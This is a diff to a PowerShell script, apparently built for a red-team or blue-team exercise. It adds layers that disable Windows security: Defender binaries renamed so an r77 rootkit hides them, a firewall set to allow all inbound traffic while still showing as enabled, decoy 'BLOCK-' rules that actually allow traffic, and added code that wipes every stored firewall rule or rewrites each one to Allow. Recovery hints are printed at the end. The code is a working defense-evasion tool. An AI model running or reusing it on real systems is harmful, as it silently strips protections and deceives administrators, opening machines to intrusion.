@@ -45,6 +45,21 @@
 #      - DisableAntiSpyware=1 + TamperProtection=0
 #      - ACL-locks the policy key so admin must take ownership to write
 #
+#   7. DEFENDER BINARY RENAME
+#      - Renames MpCmdRun.exe, MsMpEng.exe, MpSigStub.exe with $77 prefix
+#      - Binaries vanish from dir/Explorer once r77Shadow rootkit is active
+#
+#   8. FIREWALL PHANTOM (T1562.004 + T1036)
+#      - Policy ghost: EnableFirewall=1 but DefaultInboundAction=Allow on all
+#        profiles -- blue team rules are silently overridden
+#      - Flushes all persistent local firewall rules from registry store
+#      - Plants deceptive "BLOCK-*" named rules whose Action is Allow
+#      - ACL-locks the firewall policy key (ContainerInherit)
+#
+#   9. FIREWALL MANAGEMENT TOOL RENAME (T1564.001)
+#      - Renames wf.msc and FirewallControlPanel.dll with $77 prefix
+#      - GUI console and Settings firewall page stop working
+#
 # Plan reference: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
 # ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
 
@@ -599,6 +614,49 @@ foreach ($rule in $decoyRules) {
     }
 }
 
+# Part C -- Flush Persistent Local Rules
+# -----------------------------------------------------------------------
+# The policy ghost overrides enforcement but blue team can still see their
+# block rules via Get-NetFirewallRule and believe they are protected.
+# Wipe the persistent rule store so every block rule they added is gone;
+# re-creating rules AND fixing the policy ghost are both required to recover.
+$fwRulesKey = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules"
+if (Test-Path $fwRulesKey) {
+    try {
+        $ruleVals = Get-ItemProperty -Path $fwRulesKey -ErrorAction SilentlyContinue |
+            Select-Object -ExpandProperty PSObject |
+            ForEach-Object { $_.Properties | Where-Object { $_.Name -notmatch '^PS' } }
+        $ruleCount = if ($ruleVals) { @($ruleVals).Count } else { 0 }
+        Remove-Item -Path $fwRulesKey -Recurse -Force -ErrorAction Stop
+        New-Item -Path $fwRulesKey -Force | Out-Null
+        Write-Success "Flushed $ruleCount persistent local firewall rule(s) from registry store"
+    } catch {
+        Write-Warn "Could not flush firewall rule store directly: $_"
+        # Fallback: convert every existing rule value to an allow entry in-place
+        $props = Get-ItemProperty -Path $fwRulesKey -ErrorAction SilentlyContinue
+        if ($props) {
+            $props.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
+                Set-ItemProperty -Path $fwRulesKey -Name $_.Name `
+                    -Value "v2.30|Action=Allow|Active=TRUE|Dir=In|Protocol=256|Name=Allow|" `
+                    -Force -ErrorAction SilentlyContinue
+            }
+            Write-Info "Fallback: rewrote all local rule values to Action=Allow"
+        }
+    }
+} else {
+    Write-Warn "Firewall rules registry key not found -- rules may already be cleared"
+}
+
+# Also clear per-profile authorized apps lists (legacy XP-era rules still present on some builds)
+foreach ($prof in @("DomainProfile","PublicProfile","StandardProfile")) {
+    $authKey = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\$prof\AuthorizedApplications\List"
+    if (Test-Path $authKey) {
+        Remove-Item -Path $authKey -Recurse -Force -ErrorAction SilentlyContinue
+        New-Item -Path $authKey -Force -ErrorAction SilentlyContinue | Out-Null
+        Write-Success "Cleared authorized application list: $prof"
+    }
+}
+
 # ── LAYER 9: Firewall Management Tool Rename (T1564.001) ─────────────────────
 Write-Section "LAYER 9 — Firewall Management Tool Rename"
 
@@ -654,9 +712,11 @@ Write-Info "      Delete DisableAntiSpyware; restore TamperProtection=5 in Defen
 Write-Info "  L7: Defender binaries renamed with `$77 prefix — find via:"
 Write-Info "      dir /a 'C:\Program Files\Windows Defender\`$77*'"
 Write-Info "      Rename back: Rename-Item `$77MpCmdRun.exe MpCmdRun.exe (after killing rootkit)"
-Write-Info "  L8: Firewall policy ghost — takeown on HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall"
+Write-Info "  L8: Firewall policy ghost -- takeown on HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall"
 Write-Info "      Then delete DefaultInboundAction / DefaultOutboundAction values in each *Profile key"
 Write-Info "      Remove decoy rules: Remove-NetFirewallRule -Name BLOCK-Unauthorized-Inbound,etc."
+Write-Info "      Persistent rules flushed -- restore via: netsh advfirewall reset"
+Write-Info "      Legacy AuthorizedApplications lists also cleared per profile"
 Write-Info "  L9: wf.msc / FirewallControlPanel.dll renamed with `$77 prefix — find and rename back"
 Write-Info "      after rootkit is removed: dir /a C:\Windows\System32\`$77*.msc"
 Write-Host ""
